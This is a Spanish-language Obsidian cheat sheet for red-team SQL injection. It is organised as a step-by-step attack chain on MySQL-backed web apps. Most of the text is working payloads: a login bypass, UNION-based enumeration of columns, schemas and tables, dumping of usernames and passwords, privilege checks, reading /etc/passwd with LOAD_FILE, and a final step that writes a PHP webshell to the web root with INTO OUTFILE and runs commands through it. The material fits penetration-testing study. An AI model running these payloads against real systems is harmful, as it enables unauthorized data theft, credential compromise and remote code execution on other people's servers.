---
aliases:
  - "SQL Injection"
  - "SQLi to RCE"
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[File Inclusion]]"
  - "[[SQLi - Union based]]"
  - "[[SQLi - Error based]]"
  - "[[SQLi - Boolean based]]"
  - "[[SQLi - Time based]]"
  - "[[SQLi - Out of Band]]"
  - "[[SQLi - Second order]]"
  - "[[SQLi - Routed]]"
  - "[[SQLi - Lateral]]"
  - "[[SQL Commands]]"
---
# SQL Injection (SQLi)

---

## Cheatsheet

### In-Band SQLi

````tabs

tab: **Union-based**
![[SQLi - Union based#^sqli-union]]

tab: **Error-based**
![[SQLi - Error based#^sqli-error]]
````

### Inferential Blind

````tabs
tab: **Boolean-based Blind**
![[SQLi - Boolean based#^sqli-boolean]]

tab: **Time-based Blind**
![[SQLi - Time based#^sqli-time]]
````

### Out-of-Band

````tabs
tab: **OOB**
![[SQLi - Out of Band#^sqli-out]]
````

### Técnicas Avanzadas y de Contexto Específico

````tabs
tab: **Second-order**
![[SQLi - Second order#^sqli-second]]

tab: **Routed**
![[SQLi - Routed#^sqli-routed]]

tab: **Lateral**
![[SQLi - Lateral#^sqli-lateral]]
````


---

## Paso a paso

### 1. Auth Bypass (Acceso Inicial)

Búsqueda de saltarse formularios de login mediante alteraciones de la lógica SQL o cierre de sentencias.
```SQL
admin' or '1'='1       -- Bypass básico
admin')-- -            -- Bypass con cierre de paréntesis y comentario
```

### 2. Reconocimiento y Estructura (Union-Based Setup)

Fase para determinar el número exacto de columnas de la consulta original, requisito fundamental para poder inyectar un `UNION SELECT`.
```SQL
-- Detectar columnas incrementando el número (hasta que de error)
' order by 1-- -
select username from users where id = '3' order by 3; 

-- Validar inyección Union (ejemplo asumiendo 3 columnas)
cn' UNION select 1,2,3-- -
select username from users where id = '3' union select 1;

-- Probar UNION con un ID inexistente para limpiar el output
select username from users where id = '332131' union select 1;
```

### 3. Enumeración de Base de Datos y Fingerprinting

Extracción de información básica del sistema y confirmación del motor de la base de datos.
```SQL
-- Versión y Fingerprinting (Blind)
SELECT @@version       
SELECT SLEEP(5)        

-- Ver la Base de datos actual
cn' UNION select 1,database(),2,3-- -
```

### 4. Enumeración de Esquema (`INFORMATION_SCHEMA`)

Mapeo de la arquitectura completa (bases de datos, tablas y columnas) para encontrar dónde está la información sensible.
```SQL
-- Listar TODAS las bases de datos
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
select username as BASES_DE_DATOS from users where id = '332131' union select schema_name from information_schema.schemata;

-- Agrupar bases de datos en una sola línea (ideal si la web refleja solo 1 fila)
select username as BASES_DE_DATOS from users where id = '332131' union select group_concat(schema_name) from information_schema.schemata-- -';

-- Listar TABLAS de una base de datos específica (ej. 'dev' o 'hack4u')
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
select username as TABLAS from users where id = '332131' union select table_name from information_schema.tables where table_schema = 'hack4u';

-- Listar COLUMNAS de una tabla específica (ej. 'credentials' o 'users')
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
select username as COLUMNAS from users where id = '332131' union select column_name from information_schema.columns where table_schema = 'hack4u' and table_name = 'users';
```

### 5. Extracción de Datos (Dumpeo)

Obtención de los registros reales una vez identificada la tabla y las columnas.
```SQL
-- Dumpear usuarios y passwords separados
cn' UNION select 1, username, password, 4 from dev.credentials-- -
select username as USUARIOS from users where id = '332131' union select username from users;
select username as CONTRASEÑAS from users where id = '332131' union select password from users;

-- Dumpear concatenando usuario y contraseña (usando ':' o '0x3a' en hexa para evitar problemas de URL)
select username from users where id = '332131' union select group_concat(username,':',password) from users;
select username from users where id = '332131' union select group_concat(username,0x3a,password) from users;
```

### 6. Privilegios del Usuario

Verificación de los permisos del usuario que ejecuta la base de datos para evaluar vectores de escalada.
```SQL
-- Ver usuario actual
cn' UNION SELECT 1, user(), 3, 4-- -

-- Verificar si es Super Admin (root)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Listar todos los privilegios
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Verificar variable crítica de permisos de archivos (File I/O)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### 7. Escalada Crítica: SQLi to RCE (File I/O)

Uso de privilegios elevados y mala configuración de `secure_file_priv` para interactuar con el sistema operativo.
```SQL
-- LFI (Local File Inclusion / Lectura de archivos locales)
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

-- File Write (Escritura de archivos - Prueba simple)
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- RCE (Subida de Webshell PHP)
cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.php'-- -
-- Ejecución vía navegador: http://IP:PUERTO/shell.php?0=cat%20/etc/passwd
```

---

## Apéndice: Codificación URL y Caracteres Especiales

Referencia rápida de cómo el navegador/WAF interpreta los caracteres que rompen la sintaxis.

|**Payload**|**URL Encoded**|**Función Estructural en Inyecciones**|
|---|---|---|
|`'` (Comilla simple)|`%27`|Ruptura de cadenas de texto y escape de contexto principal.|
|`"` (Comilla doble)|`%22`|Ruptura de identificadores o strings alternativos.|
|`#` (Almohadilla)|`%23`|Operador de comentario (MySQL); trunca el resto de la consulta.|
|`;` (Punto y coma)|`%3B`|Terminador de sentencias; habilita inyecciones apiladas (Stacked).|
|`)` (Paréntesis)|`%29`|Equilibrio de sintaxis; permite cerrar funciones previas.|


---

## Overview










---

-- Rutas típicas para revisar configuraciones
-- /etc/nginx/sites-enabled/default
-- /etc/apache2/sites-enabled/000-default.conf
 
